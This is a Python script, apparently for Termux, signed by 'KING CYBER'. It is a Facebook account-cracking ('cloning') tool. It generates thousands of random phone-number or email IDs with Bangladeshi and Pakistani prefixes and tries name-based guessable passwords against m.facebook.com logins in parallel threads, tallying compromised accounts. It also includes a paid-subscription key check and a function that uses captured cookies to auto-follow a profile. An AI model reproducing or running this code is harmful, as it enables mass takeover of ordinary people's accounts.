#created by FB-KING MAHIN
#team name KING CYBER
#tottaly written by MAHIN-AHMED
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; KING \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
from datetime import date
from datetime import datetime
# from rich import print as printer pelting
from datetime import date
import marshal
try:
    import requests
...
def Jawnx(uid):
    if len(uid)==15:
        ...
        elif uid[:6] in ['100089']           :hking = '<=> 2023'
        else:hking=''
...
mahin_xz = [
 ann,winn,linuxx]
dvcc = random.choice(mahin_xz)
def clear():
    os.system('clear')
def banner2():
    os.system('clear')
    print(f"""{warn}
MR \033[1;37m a88888b.  888888ba   .d888888  d8888888P dP    dP    
...
{warna}---------------------------------------------------{P}
 ...
 Tool Name {M}:\033[1;37m CRAZY-GREEN
...
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.88888Pro777phpo-cov', 'r').read()
except:
    kok=open('/data/data/com.termux/files/usr/bin/.88888Pro777phpo-cov', 'w')
    kok.write(myid)
    kok.close()
def Subscraption():
    key1=open('/data/data/com.termux/files/usr/bin/.88888Pro777phpo-cov', 'r').read()
    os.system('clear')
    banner2()
    r1=requests.get("shorturl.at/ckquv").text
    if key1 in r1:
        os.system('clear')
        banner2()
        print(f"{H}Hi Dear User Your Subscraption Actived  {N}");time.sleep(2)
        menu()
    else:
        time.sleep(1.5)
        print(f"{RED}Hi Dear User Your Subscraption Expired{N}")
        time.sleep(2)
        os.system("clear")
        ...
        if opt =='4':
            ...
            print('\n\033[1;92mChoose valid option\033[0;97m');Subscraption()
myid=uuid.uuid4().hex[:100].upper()
try:
    key2 = open('/data/data/com.termux/files/usr/bin/.crazy_hphpo-cov', 'r').read()
except:
    kok=open('/data/data/com.termux/files/usr/bin/.crazy_hphpo-cov', 'w')
    kok.write(myid)
    kok.close()
def Subscraption1():
    key2=open('/data/data/com.termux/files/usr/bin/.crazy_hphpo-cov', 'r').read()
    ...
    if key2 in r1:
        ...
        if opt =='4':
            ...
            print('\n\033[1;92mChoose valid option\033[0;97m');Subscraption()
try:
    ck = requests.get('https://cutt.ly/32Cwz4L').text
except:exit(f'{M}Use Vpn Your Net connection error ')
...
def dupcutter():
    os.system('clear');banner2();print(f' {P}Example   {M}:{H} /sdcard/crazy.txt');print(led)
...
def gmail():
        os.system('rm -rf .king_xd.txt')
        clear();banner2();print(led);print(f'{P} Example :{H} khan,ali,nil,mahin,shorif,,,,,etc\033[0;97m');print(led)
        first = input(f'{P}Put First Name:{H} ')
        clear();banner2();print(led);print(f'{P} Example :{H} hasan,khan,ahmed,islam,hossain,,,,,etc\033[0;97m');print(led);print(f'{P} Saved First Name : {H}'+first);print(led)
        last = input(f'{P}Put Last Name:{H} ')
        clear();banner2();print(f' {P}Example : {H}@gmail.com,@yahoo.com,@hotmail.com\033[0;97m')
        domain = input(f' Put Domain Name :{H} ')
        clear();banner2();print(f' Example : {P}[{H}3000{P}|{H}5000{P}|{H}7000{P}|{H}10000{P}]');print(led)
        try:
            limit = int(input(f' Input Limit :{H}  '))
        except ValueError:
            limit = 50000
        clear();banner2();print(led);print(f'\x1b[1;97m[1] Method {P}[{H}M1+Fast{P}]\x1b[1;92m');print(f'\x1b[1;97m[2] Method {P}[{H}M2{P}]\x1b[1;92m');print(f'\x1b[1;97m[3] Method {P}[{H}M3{P}]\x1b[1;92m');print(led)
        mthd = input(f'{P}Select Option :{H}')
        clear();banner2();print(f'\x1b[1;97m[1] \033[1;97mCrack Auto Pass \033[1;92mName+123');print(f'\x1b[1;97m[2] \033[1;97mCrack Auto Pass \033[1;92mName+1234');print(f'\x1b[1;97m[3] \033[1;97mCrack Auto Pass \033[1;92mName+1234+12345');print(f'\x1b[1;97m[4] \033[1;97mCrack Ind/Pak \033[1;92mName+786+Khan12');print(led)
        pxc = input(f'{P}Select Option :{H}')
        clear();banner2();jalan(f'{P} Please wait server checking ')
        lists = ['3','4']
        for xd in range(limit):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.king_xd.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.king_xd.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.king_xd.txt', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            #tkk = tk.replace('****')
            clear()
            os.system("clear");banner2();print(f' Total Idz Crack :{H} {tl}{P}');print(f' gmail selected : {H} {tk}{P}');print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
            for user in fo:
                ...
                ls = last_name.lower()
                if pxc in ['1','01']:
                    pwv = [first_name+last_name,first_name+' '+last_name,]
                elif pxc in ['2','02']:
                    pwv = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
                elif pxc in ['3','03']:
                    pwv = [first_name+last_name,first_name+' '+last_name,last_name+'123',first_name+'1234',last_name+'1234',first_name+'123']
                elif pxc in ['4','04']:
                    pwv = [first_name+last_name,first_name+' '+last_name,first_name+'123',first_name+'1234',first_name+'12',last_name+'123']
                else:
                    pwv = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'1234',fs+'12345',fs+'1122']
                if mthd in ['1','01']:
                    king___xd.submit(filexxxx,idf,pwv)
                elif mthd in ['2','02']:
                    king___xd.submit(filexxxx1,idf,pwv) 
                elif mthd in ['3','03']:
                      king___xd.submit(filexxxx,idf,pwv)
                else:
                    king___xd.submit(filexxxx,idf,pwv)
...
def s11():
    idf=[]
    os.system('clear');banner2();print(f' Example : {P}[{H}017{P}|{H}019{P}|{H}018{P}|{H}016{P}|{H}013{P}]');print(led)
    check = input(f'{P}Put Number {M} :{H}')
    print(led);print(f' Example : {P}[{H}1{P}|{H}2{P}|{H}3{P}|{H}4{P}|{H}5{P}|{H}6{P}|{H}7{P}|{H}8{P}|{H}9{P}|{H}0{P}]');print(led)
    checkx = input(f'{P}Put Option {M} :{H}')
    clear();banner2()
    print(f' Example : {P}[{H}3000{P}|{H}5000{P}|{H}7000{P}|{H}10000{P}]');print(led)
    limit = int(input(f' {P}Input Limit {M}:{H}  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        idf.append(nmp)
    with ThreadPool(max_workers=30) as crazy_xd:
        os.system('clear')
        banner2()
        idx = str(len(idf))
        print(f' Crack User From : {H}{frm}{P}')
        print(f' Total Idz Crack : {H}{idx}{P}')
        print(' code selected : '+check+checkx)
        print('\x1b[1;92m Cloning Started Enjoy\033[1;97m')
        print(led)
        for check1 in idf:
...
def crazyx():
    ...
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    print(led);print(f' Example : {P}[{H}6{P}|{H}7{P}|{H}8{P}|{H}9{P}|{H}10{P}|{H}11{H}]');print(led)
    psl = int(input(f" {B}Put Pass Digit {M} : {H}"))
    with ThreadPool(max_workers=30) as zim:
        os.system('clear')
        banner2()
        tl = str(len(user))
        ak = c_mange[:4]
        print(f' Crack User From : {H}{frm}{P}');print(f' Total Idz Crack : {H}{tl}{P}');print(f' Code Selected   : {H}{ak}{B}-{H}{psl}{P}');print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
        for guru in user:
            idf = kode+guru
            pwv = [idf[:7],idf[:6],idf,guru] 
            zim.submit(filexxxx,idf,pwv)
    print(led);print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+str(len(ok)));print(f' {P}Total cp : {K}'+str(len(cp)));print(led)
...
def bd3():
    idf=[]
    os.system('clear');banner2();print(f' Example : {P}[{H}017*{P}|{H}019*{P}|{H}018*{P}|{H}016*{P}|{H}013*{P}]');print(led)
    check = input(f'\033[1;37m Input Code :{H} ');print(led);print(f' Example : {P}[{H}3000{P}|{H}5000{P}|{H}7000{P}|{H}10000{P}]');print(led)
    limit = int(input(f' Input Limit :{H}  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        idf.append(nmp)
    with ThreadPool(max_workers=40) as crazy_xd:
        ...
        banner2()
        idx = str(len(idf))
        print(f' Crack User From : {H}{frm}{P}');print(f' Total Idz Crack : {H}{idx}{P}');print(f' Code Selected   : {H}{check}{P}');print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
        for check1 in idf:
            idf = check+check1
...
def pk2():
    idf=[]
    os.system('clear');banner2();print(f' Example : {P}[{H}0315{P}|{H}0306{P}|{H}0345{P}|{H}0335{P}|{H}0306{P}]');print(led)
    check = input(f'\033[1;37m Input Code :{H} ');print(led);print(f' Example : {P}[{H}3000{P}|{H}5000{P}|{H}7000{P}|{H}10000{P}]');print(led)
    limit = int(input(f'{P} Input Limit {H}:{H}  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        idf.append(nmp)
...
def setting():
    clear();banner2();print(f'\x1b[1;97mTotal Idz Crack  {M}: {H}'+str(len(id)));print(led);print(f'\x1b[1;97m[1] Old Ids Crack');print(f'\x1b[1;97m[2] New Ids Crack {P}[{H}Try{P}]\x1b[1;92m');print(f'\x1b[1;97m[3] Mix Ids Crack ');print(led)
    ...
    if hu in ['1','01']:
        ...
        print(' wrong ')
        menu()
    clear();banner2();print(f'\x1b[1;97mTotal Idz Crack  {M}: {H}'+str(len(id)));print(led);print(f'\x1b[1;97m[1] Method {P}[{H}M1+Fast{P}]\x1b[1;92m');print(f'\x1b[1;97m[2] Method {P}[{H}M2{P}]\x1b[1;92m');print(f'\x1b[1;97m[3] Method {P}[{H}M3{P}]\x1b[1;92m');print(led)
    hc = input(f'{P}[{H}+{P}] Choose {M}:{H} ')
    if hc in ['1','01']:
        method.append('new_crack')
        password()
    elif hc in ['2','02']:
...
def password():
    ...
    if hc in ['4','04']:
        pwb()
def passwrd3():
    os.system("clear");banner2();print(f' Crack User From : {H}{frm}{P}');print(f'{P} Total Idz Crack {M}: {H}'+str(len(id)));print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
    with tred(max_workers=70) as pool:
        for mahin_xd in id2:
            try:
                idf,nmf,ttl = mahin_xd.split('|')[0],mahin_xd.split('|')[1].lower(),mahin_xd.split('|')[2].lower()
            except:
                idf,nmf = mahin_xd.split('|')[0],mahin_xd.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            try:
                pwv = []
            except:
            ...
            elif 'new_crack' in method:
                pool.submit(filexxxx,idf,pwv)
            else:
                pool.submit(filexxxx,idf,pwv)
    print(led)
    print(f'{N} Hi Dear User Crack process has been completed')
    print(f' {P}Total ok : {H}'+str(len(ok)))
    print(f' {P}Total cp : {K}'+str(len(cp)))
    print(led)
    input('Press Enter To Go Menu')
    menu()
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100003737197315', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text


def filexxxx(idf,pwv):
    #print(user)
    global loop
    global cp
    global ok
    ...
    # 'cookie': 'datr=2avbZKtzYbPiqJTD_nS_94pu; sb=2avbZCEb-pVsEAsXj7mi8N77; m_pixel_ratio=3; wd=360x703; fr=0HoHAz1dJ2u0vVWsL..Bk26vZ.0o.AAA.0.0.Bk26wC.AWUe0-d0N_Y',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.70"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"vivo 1933"',
...
def crackxxx(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            ses.headers.update({"Host": 'm.facebook.com',"upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt": "1","x-requested-with": "mark.via.gp","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/","accept-encoding": "gzip, deflate",
